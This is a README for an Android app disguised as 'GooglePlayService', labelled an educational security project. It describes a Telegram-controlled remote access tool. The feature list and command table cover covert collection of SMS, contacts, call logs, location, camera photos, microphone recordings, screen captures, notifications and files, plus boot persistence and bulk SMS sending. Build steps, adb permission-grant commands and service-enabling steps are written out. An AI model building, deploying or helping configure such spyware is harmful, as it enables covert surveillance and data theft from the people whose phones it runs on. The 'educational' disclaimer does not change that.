# GooglePlayService.apk

**Android Security Research & Educational Project**

GooglePlayService.apk is an Android-based security research project created for educational purposes — experimenting with Android background services, system events, accessibility APIs, and Telegram-based remote communication.

⚠️ **Disclaimer:** For educational, research, and authorized security-testing purposes only. Do not use on devices you don't own or have explicit permission to test.

---

## Features

- Background service + boot persistence
- Telegram Bot API remote control
- Accessibility API (screen lock)
- MediaProjection screen capture
- Camera2 API (front + back)
- MediaRecorder audio recording
- GPS location tracking
- SMS, contacts, call log access
- Notification listener (all apps)
- Auto SMS forwarding
- Call monitoring (incoming/outgoing/missed)
- Storage watcher (WhatsApp, Telegram, Camera, Downloads)
- Auto-upload photos/files ≤10 MB
- File system browser
- Clipboard, battery, WiFi info
- Foreground service with persistent notification

---

## Available Commands

Send to your Telegram bot. Type `/menu` for the list.

| Command | Description |
|---------|-------------|
| `/contacts` | Get contacts list |
| `/sms` | Inbox SMS (last 20) |
| `/outbox` | Sent SMS (last 20) |
| `/send_sms number\|msg` | Send SMS to a number |
| `/send_sms_all msg` | Bulk SMS to all contacts |
| `/vibrate` | Vibrate for 2 seconds |
| `/apps` | List installed apps |
| `/devices` | Device info |
| `/screen` | Screen capture |
| `/location` | GPS + Maps link |
| `/camera` | Back camera photo |
| `/cameraF` | Front camera photo |
| `/mic` | Record 10s audio |
| `/call_log` | Call history |
| `/files [path]` | List files |
| `/get <file>` | Download file |
| `/search <name>` | Find file |
| `/clipboard` | Clipboard content |
| `/battery` | Battery info |
| `/lock` | Lock screen |
| `/wifi` | WiFi info |
| `/notifications` | Recent notifications |
| `/call_status` | Call monitor status |
| `/storage_status` | Storage monitor status |

---

## Configuration

Edit `TelegramAgentService.java`:

```java
private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
private static final String CHAT_ID   = "YOUR_CHAT_ID_HERE";
```

Get bot token from **@BotFather** on Telegram.  
Get chat ID from: `https://api.telegram.org/bot<TOKEN>/getUpdates`

⚠️ Never commit real tokens to a public repository.

---

## Build

```cmd
gradlew.bat assembleDebug
adb install -r app\build\outputs\apk\debug\app-debug.apk
```

APK location:
```
app/build/outputs/apk/debug/app-debug.apk
```

---

## Required ADB Permissions

```cmd
adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.SEND_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.RECEIVE_SMS
adb shell pm grant com.thunderx.telegramagent android.permission.READ_CALL_LOG
adb shell pm grant com.thunderx.telegramagent android.permission.READ_CONTACTS
adb shell pm grant com.thunderx.telegramagent android.permission.CAMERA
adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO
adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.thunderx.telegramagent android.permission.POST_NOTIFICATIONS
```

---

## Enable Special Services

**Notification Access:**
```
Settings → Apps → Special Access → Notification Access → System Service → ON
```

**Accessibility Service:**
```
Settings → Accessibility → Installed Services → System Service → ON
```

**Battery Optimization:**
```
Settings → Apps → Android-OS → Battery → Unrestricted
```

---

## Permissions Used

**Network & System:**
INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, WAKE_LOCK, FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED

**Sensitive:**
READ_CONTACTS, READ_SMS, SEND_SMS, RECEIVE_SMS, READ_CALL_LOG, CAMERA, RECORD_AUDIO, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_AUDIO, READ_MEDIA_VIDEO, POST_NOTIFICATIONS, VIBRATE, BIND_ACCESSIBILITY_SERVICE

---

## Research Areas

- Android Services (Foreground, Accessibility, Background)
- Broadcast Receivers (BOOT_COMPLETED, SMS_RECEIVED, PHONE_STATE)
- Accessibility Services API
- Android Permission Model (Runtime, Restricted, AppOps)
- MediaProjection & VirtualDisplay
- Camera2 API & MediaRecorder
- NotificationListenerService
- Telegram Bot API integration
- APK analysis & DEX decompilation
- Mobile application security

---

## Recommended Testing Environment

- Android Emulator (with Google APIs)
- Dedicated test device (**not** your primary phone)
- Test Telegram bot + dummy accounts
- Network monitoring: Wireshark, mitmproxy
- APK analysis: JADX, Apktool, Bytecode Viewer, MobSF

---

## Security Notes

- Never store real API tokens inside an APK — they can be extracted via reverse engineering
- Always test inside isolated environments
- Revoke exposed credentials immediately if leaked
- Use only on devices you own or have written permission to test

---

## Responsible Disclosure

If you discover a vulnerability or accidentally expose credentials, **do not publish** the sensitive information. Revoke exposed credentials immediately and replace them with new ones.

---

## License

MIT License — see `LICENSE` for details.

---

## Author

**Jayasankha-dev**  
GitHub: https://github.com/Jayasankha-dev

**For educational and authorized security research only.**
